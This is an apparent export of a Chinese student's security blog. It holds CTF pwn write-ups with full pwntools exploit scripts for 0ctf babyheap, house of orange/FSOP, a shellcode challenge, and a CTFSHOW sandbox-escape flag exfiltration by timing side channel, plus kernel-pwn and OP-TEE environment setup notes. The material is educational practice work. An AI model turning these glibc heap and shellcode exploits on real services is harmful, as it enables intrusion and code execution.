{"pages":[{"title":"","text":"# ME # WHOAMI Y1seco Cyberspace Security, Beijing University of Posts and Telecommunications Mail: y1secoa@gmail.com 曾经的博客：https://blog.csdn.net/qq_45834505 梦想成为一名有产出的安全研究员 ​ 我以后再也没看到蓝色玫瑰，但知道它在那里就够了。有时夜深人静，我就将水晶花瓶移到窗前，然后背对着它站着，这时我往往能闻到飘渺的花香，就知道它肯定已经在那里了，心灵的眼睛能看清它的每一个细节。我用心来抚摸着它的每一个花瓣，看它在来自窗外的夜风中微微摇曳…… 它是一朵我只能用心来看的花。不过，我还是有希望在此生再用自己的眼睛看到一次蓝色玫瑰，据丁仪说，从量子力学的角度来讲，人的死亡过程就是由一个强观察者变为弱观察者再变为非观察者的过程，当我变成弱观察者时，玫瑰的概率云向毁灭态的坍缩速度就会慢一些，我就有希望看到它。当我走到人生的尽头，当我在弥留之际最后一次睁开眼睛，那时我所有的知性和记忆都消失在过去的深渊中，又回到童年纯真的感觉和梦幻之中，那就是量子玫瑰向我微笑的时候。 ——《三体》","link":"/about/index.html"}],"posts":[{"title":"0ctf2017-babyheap","text":"fastbin attack # 0x01 程序分析 例行检查，64 位程序，保护全开 ida 查看 main 函数，菜单题 sub_D48：对应 Allocate 申请内存地址用来存放结构体，申请内存用的是 calloc sub_E7F：对应编辑 edit，这里没有检查 size ，存在堆溢出 sub_F50: 对应 delete，free 后指针清零不存在 UAF sub_1051 就是 puts 打印 # 0x02 思路 利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写 # 0x03 EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *# p = process(&quot;./0ctf_2017_babyheap&quot;)p=remote(&quot;node4.buuoj.cn&quot;,26060)context.log_level = 'debug'def allo(size): p.recvuntil(&quot;Command: &quot;) p.sendline(str(1)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size))def fill(idx,size,content): p.recvuntil(&quot;Command: &quot;) p.sendline(str(2)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size)) p.recvuntil(&quot;Content: &quot;) p.sendline(content)def free(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(str(3)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def dump(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(str(4)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))allo(0x10)#0allo(0x10)#1allo(0x10)#2allo(0x10)#3allo(0x80)#4free(1)free(2)payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21)payload += p8(0x80)fill(0,len(payload),payload)payload = p64(0)*3 + p64(0x21)fill(3,len(payload),payload)allo(0x10)#1 The original position of 2allo(0x10)#2 4 Simultaneous pointingpayload = p64(0)*3 + p64(0x91)fill(3,len(payload),payload)allo(0x80)free(4)dump(2)content = u64(p.recvuntil('\\x7f')[-6:]+'\\x00\\x00')print(hex(content))libc_base = (content) - 0x3c4b78print(hex(libc_base))allo(0x60)free(4)payload = p64(libc_base + 0x3C4AED)fill(2,len(payload),payload)allo(0x60)allo(0x60)# gdb.attach(p)# pause()payload = 'a'*(0x8+0x2+0x8+1)payload += p64(libc_base+0x4526a)fill(6,len(payload),payload)allo(79)# gdb.attach(p)p.interactive() # 0x04 参考文章 https://blog.csdn.net/qq_43935969/article/details/115877748 https://www.cnblogs.com/Rookle/p/12901747.html","link":"/2022/01/14/0ctf_2017_babyheap/"},{"title":"BUUOJ PWN EXERCISE(二)","text":"heap # wustctf2020_easyfast(fastbin attack) 基本 fastbin attack 利用，改 chunk 到 backdoor 地址，将 if 条件中的变量覆盖为 0 拿 shell ## EXP 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *# p = process('./wustctf2020_easyfast')p = remote('node4.buuoj.cn',29433)def add(size): p.recvuntil('choice&gt;') p.sendline('1') p.recvuntil('size&gt;') p.sendline(str(size)) def delete(index): p.recvuntil('choice&gt;') p.sendline('2') p.recvuntil('index&gt;') p.sendline(str(index))def edit(idx,content): p.sendlineafter('choice&gt;','3') p.sendlineafter('index&gt;',str(idx)) p.send(content)def backdoor(): p.sendlineafter('choice&gt;','4')add(0x40)add(0x40)delete(0)delete(1)delete(0)edit(0,p64(0x602080))add(0x40)add(0x40)edit(3,p64(0))backdoor()# gdb.attach(p)p.interactive() # starctf_2019_babyshell(syscall) 1234567891011121314#!/usr/bin/env python# coding=utf-8from pwn import *context(log_level = 'debug',os = 'linux',arch = 'amd64')payload = asm(&quot;pop rdi;pop rdi;pop rdi;pop rdx;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;syscall&quot;)# sh = process(&quot;./starctf_2019_babyshell&quot;)sh = remote(&quot;node4.buuoj.cn&quot;,28428)sh.sendlineafter(&quot;plz:\\n&quot;,payload)sh.sendline('a' * 0xc + asm(shellcraft.sh()))sh.interactive() # houseoforange_hitcon_2016(house of orange,frop) # 题目分析 Build the house 即 add 函数，最多只能创建 4 次 chunk edit 其中可以重新输入长度进行堆溢出，最多 edit3 次 因此思路为首先使用 house of orange 释放出 unsorted bin 然后利用 FSOP 劫持程序流 申请一个小的 house，然后把 top chunk 的大小改小 申请一个较大的 house（此时原来的 topchunk 被释放进 unsorted bin），再申请一个 large bin 范围内的 house（切割 unsorted bin），利用该 house 泄露 libc 和堆地址 编辑 house，把剩下 unsorted bin 的 size 改为 0x60，并在其中伪造 _IO_FILE_plus结构体 和 unsorted bin chunk 在这一步中，我们首先利用 unsorted bin attack 修改 _IO_list_all ，这需要把该 chunk 的 bk 改为 _IO_list_all-0x10 再次 malloc，触发错误，获得 shell malloc 时，对 unsorted bin 进行判断，此时该 chunk 的 size 为 0x60，不满足要求，就把该 chunk 放入 small bin，并且向 bk-&gt;fd 写入 main_arena+0x58，即向 _IO_list_all 写入 main_arena+0x58 此时判断下一个 unsorted bin（_IO_list_all） ，而这里实际上没有 chunk，此时会触发错误 此时第一个 _IO_FILE_plus结构体 为 main_arena+0x58 ，而它不满足条件，就通过_chain 调到下一个_ IO_FILE_plus 结构体， _chain 位于 0x68 偏移的地方， main_arena+0x58+0x68=main_arena+0xc0 , 就是 small bin 中 0x60 大小的地方，这就回到了我们伪造的 _IO_FILE_plus结构体 。 # 思路 # 关于 house of orange 核心在于当题目中不存在 free 函数时，通过漏洞利用获得 free 的效果，即在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。 # FSOP 在 libc 的 _IO_list_all 中，存放有一个 _IO_FILE_plus 结构体的指针， 如下图，它指向 _IO_2_1_stderr_ ： 而 _IO_FILE_plus 结构体详细内容如下 其中_chain 指向下一个 _IO_FILE_plus 结构体 在 malloc 中，它调用 malloc_printerr 来打印错误，经过一系列调用，最终来到 _IO_flush_all_lockp ： 1234567891011121314while (fp != NULL){… fp = fp-&gt;_chain; ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) 如果满足以下条件： 123fp-&gt;_mode &gt; 0_IO_vtable_offset (fp) == 0fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 就会调用 _IO_OVERFLOW，并把结构体当做第一个参数传入 如果我们能够把 _IO_OVERFLOW 改为 system，并且伪造结构体，开头为 /bin/sh，就能获得 shell 了 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from LibcSearcher import *context.log_level = 'debug'# r = remote(&quot;node4.buuoj.cn&quot;, 29155)r= process('houseoforange_hitcon_2016')elf = ELF(&quot;./houseoforange_hitcon_2016&quot;)libc = ELF('./libc-2.23.so')def add(size, content, price, color): r.recvuntil(&quot;Your choice : &quot;) r.sendline('1') r.recvuntil(&quot;Length of name :&quot;) r.sendline(str(size)) r.recvuntil(&quot;Name :&quot;) r.send(content) r.recvuntil(&quot;Price of Orange:&quot;) r.sendline(str(price)) r.recvuntil(&quot;Color of Orange:&quot;) #1-7 r.sendline(str(color))def show(): r.recvuntil(&quot;Your choice : &quot;) r.sendline('2')def edit(size, content, price, color): r.recvuntil(&quot;Your choice : &quot;) r.sendline('3') r.recvuntil(&quot;Length of name :&quot;) r.sendline(str(size)) r.recvuntil(&quot;Name:&quot;) r.send(content) r.recvuntil(&quot;Price of Orange:&quot;) r.sendline(str(price)) r.recvuntil(&quot;Color of Orange:&quot;) #1-7 r.sendline(str(color))add(0x30,'aaaa\\n',0x1234,0xddaa)payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0) * 2 + p64(0xf81)edit(len(payload), payload, 666, 0xddaa)add(0x1000, 'a\\n',0x1234, 0xddaa)add(0x400, 'a' * 8, 199, 2)show()r.recvuntil('a'*8)malloc_hook = u64(r.recvuntil('\\x7f').ljust(8, '\\x00')) - 0x668 - 0x10success('malloc_hook = '+hex(malloc_hook))libc.address = malloc_hook - libc.symbols['__malloc_hook']io_list_all = libc.symbols['_IO_list_all']system = libc.symbols['system']payload = 'b' * 0x10edit(0x10, payload, 199, 2)show()r.recvuntil('b'*0x10)heap = u64(r.recvuntil('\\n').strip().ljust(8, '\\x00'))heap_base = heap - 0xE0success('heap = '+hex(heap))#pause()payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0)fake_file = '/bin/sh\\x00'+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,'\\x00')fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload, 666, 2)#pause()r.recvuntil(&quot;Your choice : &quot;)r.sendline('1')r.interactive() # 参考文章 https://bbs.pediy.com/thread-222718.htm https://www.anquanke.com/post/id/218887#h3-4 https://blog.csdn.net/weixin_44145820/article/details/105270036","link":"/2022/03/03/BUUOJ%20PWN%20EXERCISE(%E4%B8%89%EF%BC%89/"},{"title":"CTFSHOW卷王杯-pwn","text":"根据官方 wp 学习了两道好题 # check in # 思路 发现开了 **sandbox** （之后再仔细分析），然后读入姓名那里有一个明显的格式化字符串漏洞，再之后可以读入 0x90 大小的数据，然而数组大小只有 0x80 ，很明显是一个栈溢出，但是溢出的长度非常短，只有 0x10 ，也就是只能覆盖 rbp 和 ret ，在程序的最后有 close(1) 关闭了标准输出的文件描述符，也就是我们无法泄露任何信息，包括最终得到的 flag ，最后再看下此题的保护：没有开 **Canary** 和 **PIE** 保护。 首先，格式化字符串的利用方式很显然，可以用于泄露 **libc** ：通过泄露 __libc_start_main + 243 ，即可得到 libc_base 。 再来看栈溢出该如何利用，既然我们只能覆盖到 rbp 和 ret ，其中 ret 是跳转执行的地址，那么就可以考虑何处受 rbp 控制，又方便我们利用，不难想到 read 的时候，是将 0x90 的数据读到栈上的，而栈上的地址就受 rbp 控制，由汇编： 123450x4013dd &lt;main+163&gt;: lea rax,[rbp-0x80]0x4013e1 &lt;main+167&gt;: mov edx,0x900x4013e6 &lt;main+172&gt;: mov rsi,rax0x4013e9 &lt;main+175&gt;: mov edi,0x00x4013ee &lt;main+180&gt;: call 0x401100 &lt;read@plt&gt; 可见， read 的第二个参数 rsi （写入数据的地址）就是 rbp-0x80 中的内容，因此，我们可以通过控制 **rbp** 为 **bss** 段上的某地址，然后再通过 **ret** 跳转到 **0x4013dd** 的位置，即可往 **bss** 段上写入内容，再之后通过一个栈迁移，即可跳转到我们读到 bss 段上的 gadget 并执行。 最后，我们来看一下这个 sandbox ，是个黑名单，禁用 socket 那些主要就是为了防止重启输出流造成非预期的，可以先不用管，主要就是发现禁用了 open 的系统调用和 read 相关的系统调用，虽然没有禁 write 相关的系统调用，但是由于有 close(1) ，所以也无法输出，这看似是无法 orw 了，不过仔细分析后可以发现： open 的系统调用虽然被禁用了，但是我们可以用 **openat** 系统调用来代替 **open** 系统调用（ libc 中的 open 函数就是对 openat 这个底层系统调用的封装）， openat 分绝对路径和相对路径两种写法， exp 中都给出了；再来看 read ，注意到 read 相关的系统调用并非全部被禁用了，当 read 的 fd 为 0 时， read 是可用的，对于常规 orw 来说，先 open 一个文件，由于 0,1,2 都分别被标准输入，输出，报错给占用了，所以文件描述符是从 3 开始的，而若是我们在 open 前，先 **close(0)** ，再 **open** 的话，我们打开的文件的描述符就是 **0** 了，我们也就可以 **read** 读取文件内容了；最后，对于 write 来说，可以采用 **“侧信道攻击” 的方式，就是对 flag 的每一位进行爆破，与我们已经 read 读入到内存中的真实 flag 进行比对，比如，若是相等就触发死循环，那么我们就可以通过判断接收数据用了多久来判断猜测是否正确了，在当前假设下，若是超过了 1 秒，则说明我们这一位爆破猜测成功了，当然，我这里写了一个 “二分法” 的版本，不然会耗费很长时间（其实， CTFshow 的 flag 好像用的是 uuid 字符串，也就是 {} 中的内容仅局限于 -0123456789abcdef 这几个字符，因此，应该还能进一步缩短我 exp 的爆破时长）。由于 “侧信道攻击” 最好使用 shellcode 来实现，故在之前需要用 mprotect 的 gadget 链改一下 bss 段的可执行权限，而一次性只能读入 0x80 大小的数据，可能无法将 orw 的 shellcode 和 mprotect 的 gadget 一起读进 bss 段，因此，我们可以先写一小段 ** **shellcode** 作为跳板和 mprotect 的 gadget 一起读入到 bss 段，再通过这个跳板，将 orw 的 shellcode 读到 bss 段上并跳转执行 # EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102from pwn import *context(os = &quot;linux&quot;, arch = &quot;amd64&quot;)possible_list = &quot;-0123456789abcdefghijklmnopqrstuvwxyz{}&quot;elf = ELF(&quot;./checkin&quot;)libc = ELF('./libc-2.30.so')bss_addr = elf.bss() + 0x500read_addr = 0x4013DDleave_addr = 0x401402def pwn(pos, char): io.sendlineafter(b&quot;name :\\n&quot;, b'%25$p') io.recvuntil(b&quot;Hello, &quot;) libc_base = int(io.recv(14)[2:], 16) - 243 - libc.sym['__libc_start_main'] payload = b'\\x00'*0x80 + p64(bss_addr + 0x80) + p64(read_addr) io.sendafter(b&quot;check in :\\n&quot;, payload) shellcode_read = f''' xor rax, rax xor rdi, rdi push {bss_addr+0x100} pop rsi push 0x100 pop rdx syscall jmp rsi ''' pop_rdi_ret = libc_base + 0x26bb2 pop_rsi_ret = libc_base + 0x2709c pop_rdx_r12_ret = libc_base + 0x11c421 mprotect_addr = libc_base + libc.sym['mprotect'] payload = p64(pop_rdi_ret) + p64(bss_addr &amp; 0xfffff000) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_r12_ret) + p64(7) + p64(0) + p64(mprotect_addr) payload += p64(bss_addr + len(payload) + 8) + asm(shellcode_read) payload = payload.ljust(0x80, b'\\x00') + p64(bss_addr - 8) + p64(leave_addr) sleep(0.1) io.send(payload) shellcode_main = f''' /* close(0) */ push 3 pop rax xor rdi, rdi syscall /* openat(&quot;/flag&quot;) */ push 257 pop rax /* ( absolute path ) */ mov rsi, 0x67616c662f push rsi mov rsi, rsp /* ( relative path ) push -100 pop rdi push 0x67616c66 push rsp pop rsi */ syscall /* read flag */ xor rax, rax xor rdi, rdi mov rsi, rsp push 0x50 pop rdx syscall /* blow up flag */ mov al, byte ptr[rsi+{pos}] cmp al, {char} ja $-2 ret ''' sleep(0.1) io.send(asm(shellcode_main))if __name__ == '__main__' : start = time.time() pos = 0 flag = &quot;&quot; while True: left, right = 0, len(possible_list)-1 while left &lt; right : mid = (left + right) &gt;&gt; 1 io = remote(&quot;pwn.challenge.ctf.show&quot;, 28102) pwn(pos, ord(possible_list[mid])) s = time.time() io.recv(timeout = 1) t = time.time() io.close() if t - s &gt; 1 : left = mid + 1 else : right = mid flag += possible_list[left] info(flag) if possible_list[left] == '}' : break pos = pos + 1 success(flag) end = time.time() success(&quot;time:\\t&quot; + str(end - start) + &quot;s&quot;) # Incomplete Menu # 思路 这题给出了一个不完整的菜单，只有 new 和 edit ， new 就是新建一个 ** 任意大小（无限制）** 的堆块，最多只可以创建 5 个堆块， edit 可以输入需要读进某堆块中内容的长度 len ，如果输入的长度 len 超过了该堆块的大小 size ，则实际读入长度 Len = size ，否则 Len = len 。漏洞点在于：在将读入内容的最后一字节改为 \\x00 的时候，长度用的是用户输入的长度 len ，而并非实际读入的长度 Len ，这样就会导致某堆块后面的任意某字节会被 “刷零”，不过每个堆块只能被 edit 一次。 没有 show ，不能泄露信息，不过有走 IO 流输出的函数，如 puts 和 printf ，因此容易想到通过劫持 stdout 来进行信息泄露，没有 delete 函数，不能对堆块进行 free ，其实可以通过漏洞改 top chunk 的 size ，将它改小以后（要保证后三位不动），再申请一个大堆块，就能将原先的 top chunk 给 free 调了，不过在这里貌似并没有太大的用处。 我们只有这一个可利用的漏洞，又需要劫持到 stdout ，那就需要知道 stdout 与堆块地址的偏移，对于一般的堆块，其地址与 libc 地址的偏移肯定是无法确定的，但是这题可以申请任意大的堆块，也就是可以通过 mmap 申请堆块，而 **mmap** 申请出来的堆块，是紧接在 **libc** 的上方的，其地址与 **libc** 中地址的偏移是可以确定的，这里可以通过将 **_IO_2_1_stdout_** 的 **_IO_read_end** 和 **_IO_write_base** 的最后一字节都改为 **\\x00** ，这样他们就相等了，也就可以通过走 IO 的输出函数泄露出其中（ _IO_write_base ~ _IO_write_ptr ）包含的 libc 地址，进而得到 libc_base 。 泄露出 libc_base 之后，我们肯定是需要一个 “任意写” 漏洞，劫持一些函数或者 IO 流这些才能完成攻击。不难想到，可以通过劫持 stdin 来实现，这里我们按照和上面类似的方式，修改 **_IO_2_1_stdin_** 的 **_IO_buf_base** 中的最后一字节为 **\\x00** ，这时， _IO_buf_base 正好指向了 _IO_2_1_stdin_ ，而我们读入的时候，用的是 fgets ，这是一个走 IO 流的读入函数（这个函数就是读一整行到 stdin 缓冲区，然后再从缓冲区取出指定长度的数据，因此读数据会被 \\n 截断，或者已经从缓冲区取到了所需长度的数据，也不再会刷新缓冲区往后读取数据了），因此，我们可以通过 fgets 读入任意内容到被伪造的 _IO_buf_base （ _IO_2_1_stdin_ ）处，这样就可以再劫持一次 stdin 进行任意写了，我们读入多少字节到缓冲区， _IO_read_end 就会相应加多少，从缓冲区读取多少字节到目标内存， _IO_read_ptr 就会相应加多少，不过，最多也只能一次性读入 _IO_buf_end - _IO_buf_base 大小的数据到缓冲区，如果还需要读入，则会刷新缓冲区，一次也最多只能读取 _IO_read_end - _IO_read_ptr 大小的合法数据到目标内存，此时，由于 _IO_buf_end 为 _IO_buf_base + 132 ，因此，我们只有读满 **132** 个字节，才有机会按我们第一次劫持 **stdin** 后，读入到 **_IO_buf_base** 中的值（记为 **_IO_buf_base(new)** ）刷新缓冲区，只有刷新完缓冲区之后，才能按照我们的设想进行第二次 **stdin** 的劫持。这里需要注意的是，在第一次完成 stdin 的劫持，读入 132 字节的内容到 _IO_2_1_stdin_ 中之后，会尝试从缓冲区取 16 个字节到目标内存，如果成功取出了 16 个字节，也就满足了 fgets 的需要，那么也就不会刷新缓冲区了，我们也就不能对 stdin 进行第二次劫持了。在这里， glibc 是通过判断 **_IO_read_ptr** 是否小于 **_IO_read_end** 来判断缓冲区中是否还有剩余的数据，因此，我们可以在第一次劫持 stdin 往 _IO_2_1_stdin_ 中写内容的时候，修改其中的 **_IO_read_ptr** 等于 **_IO_read_end** ，这里的 _IO_read_end 是指读完 132 个字节后的值（ _IO_buf_base(new) + 132 ），也就是需要 _IO_read_ptr = _IO_buf_base(new) + 132 ，其实，这里也不一定是要加上 132 ，略小一点，只要保证和 _IO_read_end 差值不足大约 16 个字节，可以有刷新缓冲区的机会即可，并且， glibc 源码中也只是判断了 _IO_read_ptr 是否小于 _IO_read_end ，故还可以将 _IO_read_ptr 改为大于 _IO_read_end ，比如 _IO_read_ptr = _IO_buf_base(new) + 200 也行。在这里，我是通过劫持 **IO_list_all** 来打 **FSOP** 的，通过读取 choice 的 fgets 进行 “任意写” 以后，由于获取到的值并非菜单中的选项 1 或 2 ，就会走到 exit ，直接触发 FSOP 。 # EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context(arch='amd64', log_level='debug')io = remote(&quot;pwn.challenge.ctf.show&quot;,28121)# io = process('./pwn')elf = ELF('./pwn')libc = ELF(&quot;./libc-2.27.so&quot;)def get_IO_str_jumps(): IO_file_jumps_offset = libc.sym['_IO_file_jumps'] IO_str_underflow_offset = libc.sym['_IO_str_underflow'] for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: return possible_IO_str_jumps_offsetdef new(size): io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;) io.sendlineafter(&quot;&gt;&gt; &quot;, str(size))def edit(index, length, content): io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;2&quot;) io.sendlineafter(&quot;&gt;&gt; &quot;, str(index)) io.sendlineafter(&quot;&gt;&gt; &quot;, str(length)) io.sendafter(&quot;&gt;&gt; &quot;, content)def new_x(size): io.sendline(&quot;1&quot;) sleep(0.1) io.sendline(str(size))def edit_x(index, length, content): io.sendline(&quot;2&quot;) sleep(0.1) io.sendline(str(index)) sleep(0.1) io.sendline(str(length)) sleep(0.1) io.send(content)new(0x200000);edit(0, 0x201000 - 0x10 + libc.sym['_IO_2_1_stdout_'] + 0x10 + 1, '\\n') # _IO_read_endnew_x(0x200000);edit_x(1, 0x201000 * 2 - 0x10 + libc.sym['_IO_2_1_stdout_'] + 0x20 + 1, '\\n') # _IO_write_baselibc_base = u64(io.recvline()[8:16]) - libc.sym['__free_hook'] + 0x38 # _IO_stdfile_2_lock (_IO_2_1_stderr_.file._lock)success(&quot;libc_base:\\t&quot; + hex(libc_base))payload = p64(0)*5 + p64(1) + p64(0) + p64(libc_base + next(libc.search(b'/bin/sh')))payload = payload.ljust(0xd8, b'\\x00') + p64(libc_base + get_IO_str_jumps() - 8)payload += p64(0) + p64(libc_base + libc.sym['system'])new(0x200000);edit(2, 0x201000 * 3 - 0x10 + libc.sym['_IO_2_1_stdin_'] + 0x38 + 1, payload) # _IO_buf_basepayload = p64(0xfbad208b) # _flagspayload += p64(libc_base + libc.sym['_IO_list_all'] + 132) # _IO_read_ptrpayload += p64(libc_base + libc.sym['_IO_list_all']) * 6payload += p64(libc_base + libc.sym['_IO_list_all'] + 0x10) # _IO_buf_endpayload = payload.ljust(132, b'\\x00') + p64(libc_base - (0x201000 * 3 - 0x10))io.sendlineafter(&quot;&gt;&gt; &quot;, payload)io.interactive() # 参考 ctfshow 卷王杯官方 wp","link":"/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/"},{"title":"Kernel Pwn 学习（一）","text":"kernel pwn 环境搭建 # 编译内核 首先到 linux 内核官网下载一份内核源代码并解压 选择一个版本下载，我选的是 4.9 [tallball]， 之后安装需要的依赖 12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 解压源码后进入内核目录，输入命令 sudo make menuconfig 进入内核设置 进入 kernel hacking，检查保证勾选了以下选项 (其实默认都是勾选的，只是进去看一眼而已) Kernel debugging Compile-time checks and compiler options —&gt; Compile the kernel with debug info 和 Compile the kernel with frame pointers KGDB: kernel debugger 保存并退出 sudo make bzImage 生成 bzImage，过程挺久的，完成后在 boot 下生成了一个 bzImage 文件 注: 在过程中可能报错 没有规则可制作目标debian/certs/debian-uefi-certs.pem由certs/x509_certificate_list需求停止 解决方法：在主目录 /usr/src/linux… 中修改.config 文件，去掉上述内容（如果还是不行就修改 linux.4.9 中的.config 对应部分为空 重新编译即可 # 编译 busybox 构建文件系统 在 busybox 官网下载 busybox 文件，最新版的就行 解压后进入目录， make menuconfig ，同样会进入图形界面，在 Settings 上勾选 Build static binary (no shared libs), 然后保存退出 编译，执行 make install ，根目录下会生成一个 _install 文件夹，进入文件夹配置 123456cd _installmkdir procmkdir systouch inittouch packetchmod +x init 编辑 init 文件，用于内核初始化 123456789101112131415#!/bin/shecho &quot;{==DBG==} INIT SCRIPT&quot;mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp#mount指令 挂载某个分区到某个文件，这样就将分区与文件建立联系从而访问文件时就可以访问分区。# insmod /xxx.ko # 加载模块# insmod /hello.ko # 加载hello.ko模块mdev -s # We need this to find /dev/sda laterecho -e &quot;{==DBG==} Boot took $(cut -d' ' -f1 /proc/uptime) seconds&quot;setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root 几个常见指令 insmod: 指定模块加载到内核中 rmmod: 从内核中卸载指定模块 lsmod: 列出已经加载的模块 在 packet 中写入，用于将 FileSystem 打包成映像 123#!/bin/shecho &quot;Generate rootfs.img&quot;find . | cpio -o --format=newc &gt; ./rootfs.img 运行 packet 将得到 rootfs.img 文件 # 运行内核 安装 qemu 1234安装QEMU的依赖库sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-devsudo apt-get install qemu测试输入qemu + tab 如果有很多实例回显，就说明安装成功 之后写一个 shell 脚本启动 qemu, 将前面生成的 bzImage,rootfs.img 一起放到_install 文件夹下，运行 boot.sh，结果如下 如果显示权限不够则 chmod +x boot.sh 并在 root 下运行即可 shell 中参数的含义： 123456789-m 是指定RMA大小(默认384)-kernel 是指定的内核镜像，这里是我们编译的镜像路径，也可以是我们下载好的镜像，如./vmlinuz-4.10.0-1004-gcp-initrd 设置刚刚利用 busybox 创建的 rootfs.img,作为内核启动的文件系统 -append 附加选项，指定no kaslr 可以关闭随机偏移--nographic和console=ttyS0一起使用，启动的界面就变成了当前终端-s 相当于-gdb tcp::1234的简写，可以直接通过主机的gdb远程连接-monitor 配置用户械的网络 // 将监视器重定向主机设备 /dev/null-smp 用于生明所以可能用的cps,ie,socket cores threads = maxcputs.-cpu 设置cpu的安全选项 到这里也说明了为什么 kernel pwn 题目一般都会给出这 3 个文件 .sh ,bzImage,rootfs.cpio ，分别是启动脚本，kernel 镜像以及文件系统映像 一般来说 kernel pwn 里面，漏洞通常是出现在 ko 文件，也就是模块文件，驱动 文件中，而 kernel pwn 的最终目标一般是提权，拿到 root 才能读取 flag # 参考文章 https://blog.csdn.net/qq_40827990/article/details/97036109 https://n0va-scy.github.io/2020/06/21/kernel pwn 环境搭建 /","link":"/2022/02/09/Kernel%20Pwn%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"基于QEMU的OPTEE&#x2F;ATF学习","text":"OPTEE/ATF # 环境安装问题 # Ubuntu 20.04, 19.10 or 19.04 出现 libqtgui4 : Depends: libpng12-0 (&gt;= 1.2.13-4) but it is not installed E: Unmet dependencies. Try ‘apt --fix-broken install’ with no packages (or specify a solution). 问题的解决方法： Ubuntu 20.04, 19.10 或者 19.04 中，可以通过 PPA 安装 libpng，安装 PPA 及 libpng12-0 的命令如下。 # 解决方法 123sudo add-apt-repository ppa:linuxuprising/libpng12sudo apt updatesudo apt install libpng12-0 # OPTEE/ATF 环境安装 我的虚拟机是 Ubuntu18.04 # （一）常规流程（比较考验网速） 安装必要依赖 1234567sudo apt-get install android-tools-adb android-tools-fastboot autoconf \\ automake bc bison build-essential cscope curl device-tree-compiler \\ expect flex ftp-upload gdisk iasl libattr1-dev libc6:i386 libcap-dev \\ libfdt-dev libftdi-dev libglib2.0-dev libhidapi-dev libncurses5-dev \\ libpixman-1-dev libssl-dev libstdc++6:i386 libtool libz1:i386 make \\ mtools netcat python-crypto python-serial python-wand unzip uuid-dev \\ xdg-utils xterm xz-utils zlib1g-dev 创建 opentee 目录 1234mkdir open-tee //创建目录cd open-tee //切换到创建的目录repo init -u https://github.com/OP-TEE/manifest.git -m default_stable.xml --repo-url=https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/ -b 2.6.0 //初始化repo,使用清华的repo减少一些麻烦 打开.repo/manifest.xml，在 revision 后添加 clone-depth=“1”，因为一些 linux project,qemu project 太大，只克隆一层 1time repo sync -j8 -f 获取 toolchain 12cd build //切换到build目录make -f toolchain.mk toolchains //下载toolchain 开始编译使用 qemu 运行 OP-TEE 的工程 准备好 toolchain 和 source code 之后，下一步就是编译工程，具体操作如下： 12cd build //切换到build目录make -f qemu.mk all //编译工程 启动 qemu 12cd buildmake -f qemu.mk run-only 运行 OP-TEE 和 linux 在 qemu 界面中输入字母 “c” 回车之后，就会启动两个 terminal，一个是 OP-TEE 的 terminal, 另外一个是 linux 的 terminal。 # （二）使用搭建好的的 optee https://blog.csdn.net/chelseablue1905/article/details/85344941 注意在 build_qemu.sh 时会报错， 1builddir/build/BUILD/qemu-2.11.0-rc1/util/memfd.c:40:12: error: static declaration of memfd_create follows non-static declaration 